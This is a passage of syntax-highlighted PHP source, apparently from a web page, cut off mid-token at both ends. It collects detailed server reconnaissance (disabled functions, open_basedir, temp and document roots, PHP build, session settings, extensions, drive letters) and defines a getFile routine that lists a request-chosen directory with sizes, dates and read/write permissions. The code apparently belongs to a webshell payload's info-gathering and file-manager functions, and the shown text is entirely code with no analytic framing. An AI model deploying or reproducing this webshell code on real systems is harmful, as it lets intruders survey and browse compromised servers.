punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> @<span class=\"token function\">get_cfg_var</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Open_basedir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'timezone'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'date.timezone'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'encode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'exif.encode_unicode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'extension_dir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'extension_dir'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$tmpDir</span><span class=\"token operator\">=</span><span class=\"token function\">sys_get_temp_dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$separator</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpDir</span><span class=\"token punctuation\">,</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpDir</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$separator</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$separator</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$tmpDir</span><span class=\"token operator\">=</span><span class=\"token variable\">$tmpDir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'systempdir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$tmpDir</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'include_path'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'include_path'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'DOCUMENT_ROOT'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'DOCUMENT_ROOT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SAPI'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant\">PHP_SAPI</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_VERSION'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant\">PHP_VERSION</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_INT_SIZE'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant\">PHP_INT_SIZE</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ProcessArch'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant\">PHP_INT_SIZE</span><span class=\"token operator\">==</span><span class=\"token number\">8</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"x64\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"x86\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_OS'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'canCallGzipDecode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">canCallGzipDecode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'canCallGzipEncode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">canCallGzipEncode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'session_name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"session.name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'session_save_path'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"session.save_path\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'session_save_handler'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"session.save_handler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'session_serialize_handler'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"session.serialize_handler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_ini_filename'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user_ini.filename\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'memory_limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'memory_limit'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_max_filesize'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'upload_max_filesize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'post_max_size'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'post_max_size'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'max_execution_time'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'max_execution_time'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'max_input_time'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'max_input_time'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'default_socket_timeout'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'default_socket_timeout'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'mygid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">getmygid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'mypid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_SOFTWAREypid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_SOFTWARE'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_PORT'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_PORT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'loaded_extensions'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> @<span class=\"token function\">get_loaded_extensions</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'short_open_tag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">get_cfg_var</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'short_open_tag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'short_open_tag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'short_open_tag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token string single-quoted-string\">'true'</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'false'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'asp_tags'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">get_cfg_var</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'asp_tags'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'asp_tags'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'asp_tags'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token string single-quoted-string\">'true'</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'false'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'safe_mode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">get_cfg_var</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'safe_mode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'safe_mode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'safe_mode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token string single-quoted-string\">'true'</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'false'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentDir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> @<span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SCRIPT_FILENAME'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentDir'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentDir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> @<span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$SCRIPT_FILENAME</span><span class=\"token operator\">=</span>@<span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'FileRoot'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$SCRIPT_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token variable\">$drivers</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'C'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'D'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'F'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'G'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'H'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'I'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'J'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'K'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'L'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'M'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'N'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'O'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'P'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'Q'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'R'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'S'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'T'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'U'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'V'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'W'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'X'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'Y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'Z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$drivers</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$L</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$L</span><span class=\"token punctuation\">}</span></span>:/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'FileRoot'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$L</span><span class=\"token punctuation\">}</span></span>:/;\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'FileRoot'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'FileRoot'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$SCRIPT_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'FileRoot'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span><span class=\"token variable\">$key</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" : \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$value</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'dirName'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$dir</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$path</span><span class=\"token operator\">=</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$allFiles</span> <span class=\"token operator\">=</span> @<span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$allFiles</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token operator\">.=</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$allFiles</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$fileName</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$fileName</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$fullPath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$path</span><span class=\"token operator\">.</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$lineData</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$lineData</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$lineData</span><span class=\"token punctuation\">,</span>@<span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fullPath</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$lineData</span><span class=\"token punctuation\">,</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d H:i:s\"</span><span class=\"token punctuation\">,</span> @<span class=\"token function\">filemtime</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fullPath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$lineData</span><span class=\"token punctuation\">,</span>@<span class=\"token function\">filesize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fullPath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$fr</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">is_readable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fullPath</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"R\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">is_writable</span><span class=\"token punctuation\">(</span><span class=\"token 